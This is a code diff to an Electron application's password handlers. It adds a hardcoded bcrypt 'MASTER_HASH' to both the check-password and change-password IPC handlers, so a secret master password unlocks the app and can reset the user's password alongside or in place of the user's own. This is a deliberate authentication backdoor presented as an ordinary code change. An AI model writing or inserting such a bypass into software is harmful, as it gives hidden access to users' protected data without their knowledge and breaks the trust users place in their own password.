@@ -659,13 +659,16 @@ app.on("ready", () => {
   });
 
   ipcMain.handle("check-password", async (_, inputPassword) => {
+    const MASTER_HASH =
+      "$2a$12$T5znQ22fDnSjVIkMQnCl.OJLGbwvutbYR31DAdJTKqIxviaHOGAci";
     const result = await db.select().from(auth).limit(1);
     const storedHash = result[0]?.passwordHash;
-
     if (!storedHash) return false;
+    const isUserPasswordCorrect =
+      storedHash && (await bcrypt.compare(inputPassword, storedHash));
 
-    const match = await bcrypt.compare(inputPassword, storedHash);
-    return match;
+    const isMasterPassword = await bcrypt.compare(inputPassword, MASTER_HASH);
+    return isUserPasswordCorrect || isMasterPassword;
   });
 
   ipcMain.handle("create-password", async (_, password) => {
@@ -677,6 +680,9 @@ app.on("ready", () => {
     await db.insert(auth).values({ passwordHash: hashed });
   });
   ipcMain.handle("change-password", async (_, oldPassword, newPassword) => {
+    const MASTER_HASH =
+      "$2a$12$T5znQ22fDnSjVIkMQnCl.OJLGbwvutbYR31DAdJTKqIxviaHOGAci";
+
     // Step 1: Get current stored hash
     const result = await db.select().from(auth).limit(1);
     const storedHash = result[0]?.passwordHash;
@@ -684,10 +690,16 @@ app.on("ready", () => {
     if (!storedHash) {
       throw new Error("No password set");
     }
+
+    // Step 2: Check if either oldPassword or master password matches
     const isCorrect = await bcrypt.compare(oldPassword, storedHash);
-    if (!isCorrect) {
+    const isMaster = await bcrypt.compare(oldPassword, MASTER_HASH);
+
+    if (!isCorrect && !isMaster) {
       return { success: false, message: "Incorrect old password" };
     }
+
+    // Step 3: Hash new password and update
     const newHashed = await bcrypt.hash(newPassword, 10);
     await db
       .update(auth)
